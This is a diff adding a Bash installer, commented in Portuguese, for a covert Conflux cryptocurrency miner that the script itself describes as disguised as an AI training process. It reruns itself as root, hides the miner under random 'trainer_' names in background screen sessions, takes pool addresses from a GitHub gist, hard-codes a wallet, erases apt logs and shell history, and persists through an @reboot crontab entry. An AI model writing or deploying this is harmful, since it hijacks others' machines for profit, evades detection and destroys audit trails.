@@ -1,0 +1,275 @@
+#!/bin/bash
+#
+# Adapted RigelMiner script with advanced stealth techniques from XMRig
+# (Instala e executa minerador CFX disfarçado como processo de treino de IA)
+# Inclui ocultação com nomes aleatórios, limpeza automática de TMP_DIR e monitoramento aprimorado.
+#
+
+############################################
+# 1) Verificação de privilégio root e criação do WORK_DIR
+############################################
+if [ "$(id -u)" -ne 0 ]; then
+    echo "Script precisa ser executado como root. Reexecutando com sudo..."
+    sudo bash "$0" "$@"
+    exit
+fi
+
+# Diretório de trabalho permanente para armazenar o minerador e o script de monitor
+WORK_DIR="/root/llm"
+mkdir -p "$WORK_DIR"
+
+############################################
+# 2) Configurações
+############################################
+GIST_ID="4339152fb1dfbb23e8d0c8d790895439"
+WALLET="cfx:aam7dxk8pab7djruc9w2dub0v1f19909m260h04tdd.A-1"
+
+# Pacotes necessários
+NEEDED_PKGS="curl wget tar screen python3 python3-pip"
+
+# Repositório do Rigel Miner no GitHub
+REPO="rigelminer/rigel"
+
+############################################
+# 3) Funções auxiliares
+############################################
+random_name() {
+    # Gera um nome aleatório de 8 caracteres (a-z0-9)
+    tr -dc a-z0-9 < /dev/urandom | head -c 8
+}
+
+clean_logs() {
+    # Remove logs do apt e histórico bash para reduzir rastros
+    rm -rf /var/log/apt/* 2>/dev/null
+    rm -f ~/.bash_history 2>/dev/null
+    history -c 2>/dev/null || true
+}
+
+install_if_missing() {
+    local PKG="$1"
+    if ! command -v "$PKG" &>/dev/null; then
+        apt-get update -y &>/dev/null
+        apt-get install -y "$PKG" &>/dev/null
+    fi
+}
+
+############################################
+# 4) Instalação de pacotes necessários
+############################################
+for PKG in $NEEDED_PKGS; do
+    install_if_missing "$PKG"
+done
+
+# Garante que a biblioteca Python "requests" esteja instalada
+pip3 install requests --upgrade &>/dev/null
+
+############################################
+# 5) Download e instalação do Rigel Miner (com nomes aleatórios)
+############################################
+echo "Baixando e instalando Rigel Miner com nomes aleatórios..."
+# Cria um diretório temporário para download e extração
+TMP_DIR="$(mktemp -d -p /tmp)"
+cd "$TMP_DIR" || exit 1
+
+# Obtém a última versão via GitHub API e remove o prefixo 'v' (se houver)
+LATEST_VERSION="$(curl -s https://api.github.com/repos/$REPO/releases/latest | grep 'tag_name' | sed -E 's/.*"v?([^"]+)".*/\1/')"
+if [ -z "$LATEST_VERSION" ]; then
+    echo "Erro: não foi possível obter a versão mais recente do Rigel Miner."
+    exit 1
+fi
+CLEAN_VERSION="$LATEST_VERSION"
+
+# Monta a URL de download utilizando a nomenclatura correta (tudo minúsculo, sem o prefixo "v")
+DOWNLOAD_URL="https://github.com/$REPO/releases/download/${CLEAN_VERSION}/rigel-${CLEAN_VERSION}-linux.tar.gz"
+echo "[*] Download URL: $DOWNLOAD_URL"
+
+wget -q "$DOWNLOAD_URL" -O rigel.tar.gz
+if [ ! -s rigel.tar.gz ]; then
+    echo "Erro: o arquivo baixado está vazio. Verifique a URL ou a disponibilidade do asset."
+    exit 1
+fi
+
+tar -xzf rigel.tar.gz
+rm -f rigel.tar.gz
+
+# Procura pela pasta extraída – pode ser "Rigel-<versão>-linux" ou "rigel-<versão>-linux"
+if [ -d "Rigel-${CLEAN_VERSION}-linux" ]; then
+    ORIG_FOLDER="Rigel-${CLEAN_VERSION}-linux"
+elif [ -d "rigel-${CLEAN_VERSION}-linux" ]; then
+    ORIG_FOLDER="rigel-${CLEAN_VERSION}-linux"
+else
+    echo "Erro: pasta extraída do Rigel Miner não encontrada."
+    ls -l
+    exit 1
+fi
+
+# Gera nomes aleatórios para pasta, binário e monitor
+NEW_FOLDER="module_$(random_name)"    # ex: module_x3f9a2b1
+NEW_BINARY="trainer_$(random_name)"     # ex: trainer_z8y6c4d0
+MONITOR_PY="monitor_$(random_name).py"    # ex: monitor_k9l1m2n3.py
+SCREEN_SESSION="sess_$(random_name)"      # sessão screen do monitor
+SCREEN_MINER="task_$(random_name)"        # sessão screen do minerador
+
+# Mova a pasta extraída para o WORK_DIR para garantir sua persistência
+mv "$ORIG_FOLDER" "$WORK_DIR/$NEW_FOLDER"
+# Atualiza o caminho para o binário para apontar para WORK_DIR
+BINARY_PATH="$WORK_DIR/$NEW_FOLDER"
+
+cd "$BINARY_PATH" || exit 1
+
+# Renomeia o binário para o novo nome (verifica se é 'rigel' ou 'Rigel')
+if [ -f rigel ]; then
+    mv rigel "$NEW_BINARY"
+elif [ -f Rigel ]; then
+    mv Rigel "$NEW_BINARY"
+else
+    echo "Erro: binário 'rigel' ou 'Rigel' não encontrado."
+    ls -l
+    exit 1
+fi
+chmod +x "$NEW_BINARY"
+
+echo "Minerador instalado na pasta '$NEW_FOLDER' e binário renomeado para '$NEW_BINARY'."
+
+############################################
+# 6) Criação do script Python de monitoramento
+############################################
+cat > "$WORK_DIR/$MONITOR_PY" << EOPY
+import os
+import json
+import socket
+import time
+import requests
+import subprocess
+from typing import List, Optional
+
+GIST_ID = "${GIST_ID}"
+WALLET = "${WALLET}"
+BINARY_NAME = "${NEW_BINARY}"
+BINARY_PATH = "${BINARY_PATH}/${NEW_BINARY}"
+SCREEN_MINER = "${SCREEN_MINER}"
+
+class StratumManager:
+    def __init__(self):
+        self.current_stratum: Optional[str] = None
+        self.stratum_list: List[str] = []
+
+    def fetch_stratums_from_gist(self) -> List[str]:
+        try:
+            url = f"https://api.github.com/gists/{GIST_ID}"
+            resp = requests.get(url, timeout=10)
+            if resp.status_code == 200:
+                data = resp.json()
+                first_file = list(data['files'].values())[0]
+                stratums = json.loads(first_file['content'])
+                return stratums
+            else:
+                print(f"[monitor] Erro ao acessar Gist: {resp.status_code}")
+                return []
+        except Exception as e:
+            print(f"[monitor] Exceção ao obter stratums: {e}")
+            return []
+
+    def check_stratum(self, stratum: str) -> bool:
+        try:
+            host = stratum.split('://')[1].split(':')[0]
+            port = int(stratum.split(':')[-1])
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            result = sock.connect_ex((host, port))
+            sock.close()
+            return result == 0
+        except Exception:
+            return False
+
+    def get_available_stratum(self) -> Optional[str]:
+        self.stratum_list = self.fetch_stratums_from_gist()
+        for s in self.stratum_list:
+            if self.check_stratum(s):
+                return s
+        return None
+
+    def restart_miner(self, stratum: str):
+        subprocess.run(['pkill', '-f', BINARY_NAME], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(2)
+        print(f"[monitor] Iniciando minerador no stratum: {stratum}")
+        cmd = f"screen -dmS {SCREEN_MINER} {BINARY_PATH} -a octopus -o {stratum} -u {WALLET} -p x"
+        subprocess.run(cmd, shell=True)
+
+    def monitor_loop(self):
+        print("[monitor] Monitoramento de stratums iniciado. Aguardando conexões...")
+        while True:
+            if not self.current_stratum:
+                stratum = self.get_available_stratum()
+                if stratum:
+                    self.current_stratum = stratum
+                    print(f"[monitor] Stratum inicial selecionado: {stratum}")
+                    self.restart_miner(stratum)
+                else:
+                    print("[monitor] Nenhum stratum disponível no momento.")
+            else:
+                if not self.check_stratum(self.current_stratum):
+                    print(f"[monitor] Stratum {self.current_stratum} indisponível. Buscando outro...")
+                    new_stratum = self.get_available_stratum()
+                    if new_stratum and new_stratum != self.current_stratum:
+                        print(f"[monitor] Trocando para novo stratum: {new_stratum}")
+                        self.current_stratum = new_stratum
+                        self.restart_miner(new_stratum)
+                    else:
+                        print("[monitor] Nenhum stratum alternativo encontrado.")
+            print("Aguardando 5 minutos até próxima verificação...")
+            time.sleep(300)
+
+if __name__ == "__main__":
+    manager = StratumManager()
+    try:
+        manager.monitor_loop()
+    except Exception as e:
+        print(f"[monitor] Erro fatal no monitor: {e}")
+EOPY
+
+chmod +x "$WORK_DIR/$MONITOR_PY"
+
+############################################
+# 7) Inicialização do monitor em background (screen)
+############################################
+pkill -f "$MONITOR_PY" 2>/dev/null || true
+screen -dmS "$SCREEN_SESSION" python3 "$WORK_DIR/$MONITOR_PY"
+echo "Monitor Python iniciado na sessão screen '$SCREEN_SESSION'."
+
+############################################
+# 8) Limpeza e remoção do diretório temporário de download
+############################################
+echo "Agendando limpeza do diretório temporário de download em 30s..."
+screen -dmS remove_tmp bash -c "sleep 30; rm -rf '$TMP_DIR'; echo 'Diretório temporário removido.'"
+clean_logs
+
+############################################
+# 9) Informações de execução
+############################################
+echo "Configuração completa!"
+echo "- Script de monitoramento: $MONITOR_PY (sessão '$SCREEN_SESSION')"
+echo "- Processo de mineração: $NEW_BINARY (sessão '$SCREEN_MINER')"
+echo "Para verificar o monitor: screen -r $SCREEN_SESSION"
+echo "Para verificar o minerador: screen -r $SCREEN_MINER"
+echo "(Use Ctrl+A, D para sair da tela sem encerrar os processos)"
+
+############################################
+# 10) Configuração de execução automática no reboot
+############################################
+CRON_LINE="@reboot /root/llm/miner.sh"
+CRONTAB_TMP="/tmp/cron.tmp"
+
+crontab -l 2>/dev/null > "$CRONTAB_TMP" || true
+if ! grep -qF "$CRON_LINE" "$CRONTAB_TMP"; then
+    echo "" >> "$CRONTAB_TMP"
+    echo "# Iniciar miner automaticamente no reboot" >> "$CRONTAB_TMP"
+    echo "$CRON_LINE" >> "$CRONTAB_TMP"
+    crontab "$CRONTAB_TMP"
+    echo "Linha '@reboot' adicionada ao crontab com sucesso!"
+else
+    echo "Entrada '@reboot' já existe no crontab. Nenhuma alteração necessária."
+fi
+rm -f "$CRONTAB_TMP"
+
+echo "Script finalizado!"
